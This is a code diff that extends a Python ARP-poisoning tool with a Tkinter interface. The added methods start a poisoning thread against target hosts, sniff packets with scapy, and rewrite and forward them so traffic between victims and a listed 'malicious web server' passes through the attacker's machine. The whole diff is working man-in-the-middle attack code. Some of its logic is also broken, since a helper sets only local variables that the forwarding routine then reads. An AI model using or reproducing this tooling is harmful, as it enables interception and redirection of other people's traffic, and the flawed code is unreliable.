@@ -88,4 +88,81 @@ class arpPoisoning():
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
         Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()
 
-    
+    def startProcess(self):
+        for widget in self.root.winfo_children():
+            widget.destroy()
+        self.initShow()
+        def restart_program(self):
+            python =sys.executable
+            os.execl(python, python, * sys.argv)
+        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
+
+        self.initThread()
+        while True:
+            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)
+
+    def initShow(self):
+        scroll = Scrollbar(self.root)
+        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
+        scroll.config(command=self.show.yview)
+        self.show.pack()
+        self.show.see(END)
+        self.show.update_idletasks()
+
+    def initThread(self):
+        proc_thread = None
+        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
+        proc_thread = threading.Thread(target=process.poison)
+        proc_thread.daemon = True
+        proc_thread.start()
+
+    def packetForwarding(self, packet):
+        if packet.haslayer(Ether) and packet.haslayer(IP):#check IP&Arp Layer
+            self.initSndRcv()
+            for vict in self.target:
+                if (vict["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(vict)
+                    for malWebSrv in self.maliciousWebServer:
+                        if (malWebSrv["ip"] == packet[IP].dst):
+                            receiver, receiverfound = self.rcvFound(malWebSrv)
+            if ((not senderfound) or (not receiverfound)):
+                for malWebSrv in self.maliciousWebServer:
+                    if (malWebSrv["mac"] == packet[Ether].src):
+                        sender, senderfound = self.SndFound(malWebSrv)
+                        for vict in self.target:
+                            if (vict["ip"] == packet[IP].dst):
+                                receiver, receiverfound = self.rcvFound(vict)
+            if (senderfound and receiverfound):
+                self.modifyAndSend(packet, sender, receiver)
+
+    def initSndRcv(self):
+        sender = None
+        senderfound = False
+        receiver = None
+        receiverfound = False
+
+    def rcvFound(self, subj):
+        receiver = subj
+        receiverfound = True
+        return receiver,receiverfound
+
+    def SndFound(self, subj):
+        sender = subj
+        senderfound = True
+        return sender,senderfound
+
+    def modifyAndSend(self, packet, sender, receiver):
+        packet[Ether].src = self.myMAC
+        packet[Ether].dst = receiver["mac"]
+        sendp(packet, iface=self.interface, verbose=False)
+        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
+        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
+        self.show.see(END)
+        self.show.update_idletasks()
+
+    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
+        self.rangeIPs = rangeIPs
+        self.usedIPs = usedIPs
+        self.target = target
+        self.maliciousWebServer = maliciousWebServer
+        self.myMAC = myMAC
